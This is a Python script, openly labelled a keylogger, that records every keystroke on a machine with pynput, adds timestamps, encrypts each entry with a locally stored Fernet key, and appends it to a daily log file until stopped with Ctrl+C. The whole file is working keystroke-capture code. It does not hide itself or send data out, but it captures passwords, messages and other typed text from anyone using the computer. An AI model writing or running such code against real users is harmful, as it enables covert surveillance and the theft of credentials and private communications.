from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import os
import time

# === 1. Load or Create Encryption Key ===
key_file = "secret.key"

def load_or_create_key():
    if os.path.exists(key_file):
        print("🔑 Encryption key found. Loading...")
        with open(key_file, "rb") as f:
            return f.read()
    else:
        print("🔐 Generating new encryption key...")
        key = Fernet.generate_key()
        with open(key_file, "wb") as f:
            f.write(key)
        return key

key = load_or_create_key()
cipher = Fernet(key)

# === 2. Setup Log File ===
today = datetime.now().strftime("%Y-%m-%d")
log_filename = f"log_{today}.txt"
print(f"📄 Logging keystrokes to {log_filename}")

# === 3. Define Key Press Handler ===
def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        log_entry = f"[{timestamp}] {key.char}\n"
    except AttributeError:
        log_entry = f"[{timestamp}] [{key}]\n"

    encrypted = cipher.encrypt(log_entry.encode())

    with open(log_filename, "ab") as file:
        file.write(encrypted + b"\n")

# === 4. Start the Listener ===
listener = keyboard.Listener(on_press=on_press)
listener.start()

print("✅ Keylogger started.")
print("🛑 Press Ctrl + C in this CMD window to stop.")

# === 5. Keep It Running Until Manually Stopped ===
try:
    while True:
        time.sleep(10)
except KeyboardInterrupt:
    print("\n✅ Keylogger stopped.")
    listener.stop()
